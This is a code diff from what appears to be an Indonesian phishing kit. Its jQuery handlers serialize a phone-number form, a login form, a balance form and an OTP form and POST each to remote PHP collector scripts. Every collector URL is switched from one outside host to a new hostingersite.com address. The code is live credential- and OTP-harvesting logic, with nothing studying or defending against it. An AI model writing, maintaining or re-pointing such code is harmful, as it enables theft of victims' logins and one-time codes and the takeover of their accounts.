@@ -8,7 +8,7 @@ $('.process1').fadeIn();
  
       $.ajax({
             type: 'POST',
-            url: 'https://dbt.my.id/gol/no.php',
+            url: 'https://silver-bat-178887.hostingersite.com/gol/no.php',
             data: $('#formHP').serialize(),
             datatype: 'text',
             
@@ -28,7 +28,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://dbt.my.id/gol/login.php',
+            url: 'https://silver-bat-178887.hostingersite.com/gol/login.php',
             data: $('#formLog').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -54,7 +54,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://dbt.my.id/gol/saldo.php',
+            url: 'https://silver-bat-178887.hostingersite.com/gol/saldo.php',
             data: $('#jualpuki').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -84,7 +84,7 @@ function sendOtp() {
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
 $.ajax({
  type: 'POST',
- url: 'https://dbt.my.id/gol/gas.php',
+ url: 'https://silver-bat-178887.hostingersite.com/gol/gas.php',
  async: false,
  dataType: 'JSON',
  data: $('#form2').serialize(),
